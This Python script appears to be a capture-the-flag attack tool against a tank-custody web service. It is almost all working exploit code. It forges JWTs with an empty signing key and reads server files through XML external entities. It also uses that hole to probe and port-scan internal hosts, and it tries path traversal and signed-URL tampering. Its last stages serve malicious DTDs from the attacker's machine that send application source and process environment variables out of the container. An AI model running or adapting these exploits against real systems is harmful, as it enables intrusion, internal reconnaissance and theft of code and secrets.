#!/usr/bin/env python3
"""round75 — XXE SSRF via HTTP entities + gauge-gw enumeration + OOB XXE"""
import requests, json, time, hashlib, hmac as hm, base64, socket, threading, http.server
import subprocess, re, sys

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

def xxe_ssrf(url, field="remarks", timeout=10):
    """XXE with HTTP URL instead of file://"""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "{url}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: HEALTH CHECK")
print("="*70)
try:
    r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=8)
    print(f"  [{r.status_code}] {r.text[:100]}")
except Exception as e:
    print(f"  {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: XXE SSRF — HTTP ENTITY RESOLUTION TEST")
print("="*70)
print("  Testing if lxml/libxml2 supports http:// in entity resolution")

# Test with gauge-gw (known to respond with clean JSON)
test_urls = [
    ("gauge-gw tank", "http://gauge-gw.internal:9100/v1/tanks/1/level"),
    ("gauge-gw flow", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"),
    ("localhost healthz", "http://127.0.0.1:3000/healthz"),
    ("localhost:3000 root", "http://127.0.0.1:3000/"),
]

http_ssrf_works = False
for desc, url in test_urls:
    code, val = xxe_ssrf(url, timeout=12)
    if code == 200 and val:
        print(f"  *** SSRF WORKS! {desc}: [{code}] {val[:300]} ***")
        http_ssrf_works = True
    elif code == -1:
        print(f"  {desc}: TIMEOUT (service unreachable or non-HTTP)")
    elif code == 400:
        print(f"  {desc}: [400] (response has XML-breaking chars)")
    else:
        print(f"  {desc}: [{code}] {str(val)[:150]}")
    time.sleep(0.5)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: GAUGE-GW ENUMERATION VIA XXE SSRF")
print("="*70)

if http_ssrf_works:
    print("  HTTP SSRF confirmed! Enumerating gauge-gw endpoints...")
else:
    print("  HTTP SSRF not confirmed yet, trying anyway...")

gw_urls = [
    "http://gauge-gw.internal:9100/",
    "http://gauge-gw.internal:9100/v1",
    "http://gauge-gw.internal:9100/v1/",
    "http://gauge-gw.internal:9100/healthz",
    "http://gauge-gw.internal:9100/health",
    "http://gauge-gw.internal:9100/config",
    "http://gauge-gw.internal:9100/env",
    "http://gauge-gw.internal:9100/debug",
    "http://gauge-gw.internal:9100/admin",
    "http://gauge-gw.internal:9100/flag",
    "http://gauge-gw.internal:9100/flag.txt",
    "http://gauge-gw.internal:9100/secret",
    "http://gauge-gw.internal:9100/v1/config",
    "http://gauge-gw.internal:9100/v1/secret",
    "http://gauge-gw.internal:9100/v1/flag",
    "http://gauge-gw.internal:9100/v1/env",
    "http://gauge-gw.internal:9100/v1/admin",
    "http://gauge-gw.internal:9100/v1/status",
    "http://gauge-gw.internal:9100/v1/devices",
    "http://gauge-gw.internal:9100/v1/info",
    "http://gauge-gw.internal:9100/v1/version",
    # More tanks
    "http://gauge-gw.internal:9100/v1/tanks/4/level",
    "http://gauge-gw.internal:9100/v1/tanks/5/level",
    "http://gauge-gw.internal:9100/v1/tanks/6/level",
    "http://gauge-gw.internal:9100/v1/tanks/8/level",
    # More meters
    "http://gauge-gw.internal:9100/v1/meters/loading-arm-2/flow",
    "http://gauge-gw.internal:9100/v1/meters/loading-arm-3/flow",
    # API exploration
    "http://gauge-gw.internal:9100/api",
    "http://gauge-gw.internal:9100/api/v1",
    "http://gauge-gw.internal:9100/metrics",
    "http://gauge-gw.internal:9100/probe",
]

for url in gw_urls:
    code, val = xxe_ssrf(url, timeout=8)
    if code == 200 and val:
        print(f"  *** FOUND: {url}")
        print(f"      Content: {val[:500]}")
    elif code == 400:
        print(f"  [400] {url} (response has special chars)")
    elif code == -1:
        pass  # timeout, skip silently
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: INTERNAL SSRF — LOCALHOST HIDDEN ENDPOINTS")
print("="*70)

localhost_urls = [
    "http://127.0.0.1:3000/healthz",
    "http://127.0.0.1:3000/api/auth/me",
    "http://127.0.0.1:3000/api/internal",
    "http://127.0.0.1:3000/api/internal/config",
    "http://127.0.0.1:3000/api/internal/secret",
    "http://127.0.0.1:3000/api/internal/probe",
    "http://127.0.0.1:3000/api/debug",
    "http://127.0.0.1:3000/api/config",
    "http://127.0.0.1:3000/api/env",
    "http://127.0.0.1:3000/api/flag",
    "http://127.0.0.1:3000/api/secret",
    "http://127.0.0.1:3000/internal",
    "http://127.0.0.1:3000/debug",
    "http://127.0.0.1:3000/admin",
    "http://127.0.0.1:3000/shell",
    "http://127.0.0.1:3000/llels",
    "http://127.0.0.1:3000/llehs",
    "http://127.0.0.1:3000/flag",
    "http://127.0.0.1:3000/config",
    "http://127.0.0.1:3000/env",
    "http://127.0.0.1:3000/secret",
    "http://127.0.0.1:3000/api/ops/shell",
    "http://127.0.0.1:3000/api/ops/llehs",
    "http://127.0.0.1:3000/api/ops/exec",
    "http://127.0.0.1:3000/api/ops/command",
    "http://127.0.0.1:3000/api/ops/run",
    "http://127.0.0.1:3000/api/ops/flag",
    "http://127.0.0.1:3000/api/ops/secret",
    "http://127.0.0.1:3000/api/ops/config",
    "http://127.0.0.1:3000/api/ops/env",
    "http://127.0.0.1:3000/api/ops/status",
    "http://127.0.0.1:3000/api/ops/devices",
    "http://127.0.0.1:3000/api/ops/tanks",
    "http://127.0.0.1:3000/api/ops/meters",
    "http://127.0.0.1:3000/api/ops/custody",
    "http://127.0.0.1:3000/api/ops/custody/list",
    "http://127.0.0.1:3000/api/ops/custody/tickets",
]

for url in localhost_urls:
    code, val = xxe_ssrf(url, timeout=6)
    if code == 200 and val:
        print(f"  *** FOUND: {url}")
        print(f"      Content: {val[:500]}")
    elif code == 400 and "ticket rejected" not in str(val)[:100]:
        print(f"  [400-interesting] {url}: {str(val)[:100]}")
    elif code == -1:
        pass
    time.sleep(0.2)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: DOCKER NETWORK SCAN VIA XXE SSRF")
print("="*70)
print("  Scanning 172.18.0.2-10 for web services")

for ip_last in range(2, 11):
    ip = f"172.18.0.{ip_last}"
    for port in [80, 3000, 5000, 8000, 8080, 8888, 9000, 9100]:
        url = f"http://{ip}:{port}/"
        code, val = xxe_ssrf(url, timeout=4)
        if code == 200 and val:
            print(f"  *** SERVICE: {url} → {val[:300]} ***")
        elif code == 400:
            print(f"  [400] {url} (has XML chars — service exists!)")
        elif code == -1:
            pass  # timeout
        time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: PATH TRAVERSAL IN STATIC FILES")
print("="*70)

traversal_paths = [
    "/static/../app.py",
    "/static/../../app/app.py",
    "/static/%2e%2e/app.py",
    "/static/..%2fapp.py",
    "/static/....//app.py",
    "/static/css/../../app.py",
    "/static/css/../../../app/app.py",
    # via nginx
    "/../app/app.py",
    "/..%2fapp/app.py",
]

for path in traversal_paths:
    try:
        r = requests.get(f"{CASPI}{path}", headers=AUTH_OP, timeout=5,
                        allow_redirects=False)
        if r.status_code == 200 and 'app.css' not in r.text and len(r.text) > 10:
            print(f"  *** TRAVERSAL! {path}: [{r.status_code}] {r.text[:200]} ***")
        elif r.status_code not in [400, 404]:
            print(f"  [{r.status_code}] {path}: {r.text[:80]}")
    except:
        pass

# Also try path traversal via XXE SSRF to localhost
for path in ["/static/../app.py", "/static/css/../../app.py"]:
    code, val = xxe_ssrf(f"http://127.0.0.1:3000{path}", timeout=6)
    if code == 200 and val and 'app.css' not in val:
        print(f"  *** SSRF TRAVERSAL! {path}: {val[:300]} ***")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: DOCKER MOUNTS + PROC INFO")
print("="*70)

proc_files = [
    ("/proc/self/mountinfo", "Docker mount info"),
    ("/proc/self/mounts", "mount points"),
    ("/proc/1/cmdline", "PID 1 cmdline"),  # might have env vars passed as args
    ("/proc/self/limits", "process limits"),
    ("/proc/self/sched", "scheduler info"),
]

for path, desc in proc_files:
    code, val = xxe_read(path, timeout=8)
    if code == 200 and val:
        print(f"\n  === {desc} ({path}) ===")
        lines = val.split('\n')
        for line in lines[:30]:
            if line.strip():
                print(f"    {line}")
        if len(lines) > 30:
            print(f"    ... ({len(lines)-30} more lines)")
    elif code == 400:
        print(f"  [{code}] {path} ({desc}) — has special chars/binary")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: PROBE URL MANIPULATION — QUERY STRING TEST")
print("="*70)
print("  Does the HMAC cover the full URL including query params?")

url_base = "http://gauge-gw.internal:9100/v1/tanks/1/level"
sig_base = "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"

url_tests = [
    ("original", url_base, sig_base),
    ("add ?x=1", url_base + "?x=1", sig_base),
    ("add #frag", url_base + "#frag", sig_base),
    ("trailing /", url_base + "/", sig_base),
    ("double //", url_base.replace("/level", "//level"), sig_base),
    ("case change", url_base.replace("Level", "LEVEL"), sig_base),
]

for desc, url, sig in url_tests:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe",
            json={"url": url, "sig": sig},
            headers=AUTH_OP, timeout=8)
        body = r.text[:150].replace('\n', ' ')
        if r.status_code == 200:
            print(f"  *** {desc}: [200] {body}")
        else:
            print(f"  {desc}: [{r.status_code}]")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: OOB XXE — CALLBACK TO KALI")
print("="*70)

# Get Kali's VPN IP
kali_ip = None
try:
    output = subprocess.check_output(['ip', 'addr', 'show'], text=True)
    for match in re.finditer(r'inet (192\.168\.\d+\.\d+)', output):
        kali_ip = match.group(1)
        break
    if not kali_ip:
        for match in re.finditer(r'inet (10\.\d+\.\d+\.\d+)', output):
            kali_ip = match.group(1)
            break
    if not kali_ip:
        for match in re.finditer(r'inet (\d+\.\d+\.\d+\.\d+)(?!/)', output):
            ip = match.group(1)
            if ip != '127.0.0.1':
                kali_ip = ip
                break
except:
    pass

if kali_ip:
    print(f"  Kali IP detected: {kali_ip}")

    # Start a simple HTTP listener to test reachability
    received_requests = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            received_requests.append(self.path)
            if self.path == '/evil.dtd':
                # Serve OOB DTD
                dtd = f'''<!ENTITY % file SYSTEM "file:///app/app.py">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://{kali_ip}:8877/?d=%file;'>">
%all;'''
                self.send_response(200)
                self.send_header('Content-Type', 'application/xml-dtd')
                self.end_headers()
                self.wfile.write(dtd.encode())
            elif self.path == '/evil2.dtd':
                # Try with /proc/self/environ
                dtd = f'''<!ENTITY % file SYSTEM "file:///proc/self/environ">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://{kali_ip}:8877/?d=%file;'>">
%all;'''
                self.send_response(200)
                self.send_header('Content-Type', 'application/xml-dtd')
                self.end_headers()
                self.wfile.write(dtd.encode())
            elif self.path == '/evil3.dtd':
                # Try with db.py (known readable)
                dtd = f'''<!ENTITY % file SYSTEM "file:///app/db.py">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://{kali_ip}:8877/?d=%file;'>">
%all;'''
                self.send_response(200)
                self.send_header('Content-Type', 'application/xml-dtd')
                self.end_headers()
                self.wfile.write(dtd.encode())
            elif self.path.startswith('/ftp'):
                # Log FTP-like exfiltration
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            else:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')

            print(f"  <<< CALLBACK received: {self.path}")
            if '?d=' in self.path:
                data = self.path.split('?d=', 1)[1]
                print(f"  <<< EXFIL DATA: {data[:500]}")

        def log_message(self, format, *args):
            pass  # Suppress default logging

    # Start server in background thread
    server = None
    try:
        server = http.server.HTTPServer(('0.0.0.0', 8877), Handler)
        thread = threading.Thread(target=server.handle_request)
        thread.daemon = True
        thread.start()
        time.sleep(0.5)
        print(f"  HTTP listener started on port 8877")

        # Test 1: Simple callback (no DTD)
        print("\n  --- Test 1: Simple HTTP callback ---")
        xml_callback = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "http://{kali_ip}:8877/callback_test">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''
        try:
            r = requests.post(f"{CASPI}/api/ops/custody/ingest",
                data=xml_callback, headers={**AUTH_OP, "Content-Type":"application/xml"},
                timeout=12)
            print(f"  Response: [{r.status_code}] {r.text[:200]}")
        except Exception as e:
            print(f"  Response: {e}")

        time.sleep(2)

        if '/callback_test' in received_requests:
            print("\n  *** CALLBACK CONFIRMED — container can reach Kali! ***")

            # Test 2: OOB XXE with DTD (read db.py as proof of concept)
            print("\n  --- Test 2: OOB XXE via DTD (db.py) ---")
            server2 = http.server.HTTPServer(('0.0.0.0', 8877), Handler)
            for _ in range(3):
                thread2 = threading.Thread(target=server2.handle_request)
                thread2.daemon = True
                thread2.start()

            xml_oob = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % dtd SYSTEM "http://{kali_ip}:8877/evil3.dtd">
  %dtd;
  %send;
]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''
            try:
                r = requests.post(f"{CASPI}/api/ops/custody/ingest",
                    data=xml_oob, headers={**AUTH_OP, "Content-Type":"application/xml"},
                    timeout=12)
                print(f"  OOB Response: [{r.status_code}] {r.text[:200]}")
            except Exception as e:
                print(f"  OOB Response: {e}")

            time.sleep(3)

            # Test 3: OOB XXE to read app.py
            if '/evil3.dtd' in received_requests:
                print("\n  --- Test 3: OOB XXE — app.py ---")
                server3 = http.server.HTTPServer(('0.0.0.0', 8877), Handler)
                for _ in range(3):
                    thread3 = threading.Thread(target=server3.handle_request)
                    thread3.daemon = True
                    thread3.start()

                xml_oob_app = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % dtd SYSTEM "http://{kali_ip}:8877/evil.dtd">
  %dtd;
  %send;
]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''
                try:
                    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
                        data=xml_oob_app, headers={**AUTH_OP, "Content-Type":"application/xml"},
                        timeout=12)
                    print(f"  OOB app.py Response: [{r.status_code}] {r.text[:200]}")
                except Exception as e:
                    print(f"  OOB app.py Response: {e}")

                time.sleep(3)

            # Print all received requests
            print(f"\n  All callbacks received: {received_requests}")

        else:
            print("\n  No callback received — container can't reach Kali")
            print("  (Or HTTP entity resolution is disabled)")

    except OSError as e:
        print(f"  Failed to start HTTP listener: {e}")
        print("  Port 8877 might be in use — kill any process on it and retry")
    finally:
        if server:
            try:
                server.server_close()
            except:
                pass

else:
    print("  Could not detect Kali IP — skipping OOB test")
    print("  Run: ip addr show | grep inet")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: ALTERNATIVE FILE READS")
print("="*70)

# Files we haven't tried yet
new_paths = [
    # Python importlib cache / metadata
    "/app/__pycache__/__init__.cpython-311.pyc",
    "/app/ops/__init__.py",
    "/app/ops/__pycache__/probe.cpython-311.pyc",
    "/app/api/__init__.py",
    # Supervisor / process manager configs
    "/etc/supervisor/conf.d/app.conf",
    "/etc/supervisord.conf",
    # Container env files
    "/proc/1/limits",
    "/proc/1/sched",
    # Interesting /proc files
    "/proc/self/task/1/children",
    "/proc/self/personality",
    "/proc/self/attr/current",
    # Python startup
    "/usr/local/lib/python3.11/site-packages/app/__init__.py",
    # Docker specific
    "/proc/self/cgroup",
    "/proc/self/cpuset",
    # Temp files
    "/tmp/probe_secret",
    "/tmp/secret",
    "/tmp/flag",
    "/tmp/app.py",
    "/var/tmp/secret",
]

for path in new_paths:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"  *** {path}: {val[:300]} ***")
    elif code == 400:
        print(f"  EXISTS(400): {path}")
    time.sleep(0.1)

print("\n"+"="*70)
print("DONE")
print("="*70)
